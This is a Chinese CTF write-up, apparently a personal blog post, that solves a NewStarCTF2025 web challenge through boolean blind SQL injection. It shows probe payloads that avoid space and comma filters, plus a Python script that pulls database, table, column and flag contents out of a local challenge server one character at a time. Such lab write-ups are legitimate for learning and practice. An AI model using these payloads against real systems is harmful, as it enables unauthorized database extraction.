---
title: 'NewStarCTF2025-Week4-Web 白帽小 K 的故事（2）'
abbrlink: 635d3e7d
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# NewStarCTF2025-Week4-Web 白帽小 K 的故事（2）



在经过一系列对话后，我们得知

```
1.布尔盲注
2.找flag
3.后端的查询逻辑是：SELECT 1 from Terra.animal WHERE name = '$name'
```

### 1. 探索：

过滤空格，逗号 ，/

尝试直接注入

```
name=amiya'and(1=1)%23
name=amiya'and(length(database())=5)%23
```

回显-->

为真：

![image-20260328144226907](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260328144234081.png)

为假：

![image-20260328144257521](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260328144257593.png)



### 2. 脚本

自己的脚本跑不通，去找了个大佬的脚本

具体逻辑是：

```
dic = string.digits + string.ascii_letters + "{}-_,"	//拼接字符串，制成字母表
out = ""	//准备输出
for j in range(1,80):	//从位置的第一位开始循环
    for k in dic:	//从字母表的第一位开始循环
        payload = {"name":f"amiya'&&if(substr((select(group_concat(schema_name))from(information_schema.schemata)),{j},1)='{k}',1,0)#"}
        re = requests.post(url, data=payload)
        if "ok" in re.text:
            out += k
            break	//如果成功拿到那就跳出字符表循环，继续下一位；否则继续循环找字符
    print(out)
```

当前数据库是terra

```
import requests
import string

url = "http://127.0.0.1:61865/search"
dic = string.digits + string.ascii_letters + "{}-_,"
out = ""

for j in range(1, 80):
    for k in dic:
        # payload = {"name":"amiya'&&if(substr(database(),1,1)='t',1,0)#"}  //此为当前数据库，但flag不在当前数据库中
        # payload = {"name":f"amiya'&&if(substr((select(group_concat(schema_name))from(information_schema.schemata)),{j},1)='{k}',1,0)#"}
        # payload = {"name":f"amiya'&&if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='Flag')),{j},1)='{k}',1,0)#"}
        # payload = {"name": f"amiya'&&if(substr((select(group_concat(column_name))from(information_schema.columns)where((table_schema='Flag')and(table_name='flag'))),{j},1)='{k}',1,0)#"}
        payload = {
            "name": f"amiya'&&if(substr((select(flag)from(Flag.flag)),{j},1)='{k}',1,0)#"
        }
        re = requests.post(url, data=payload)
        # print(re.text)
        if "ok" in re.text:
            out += k
            break
    print(out)

```

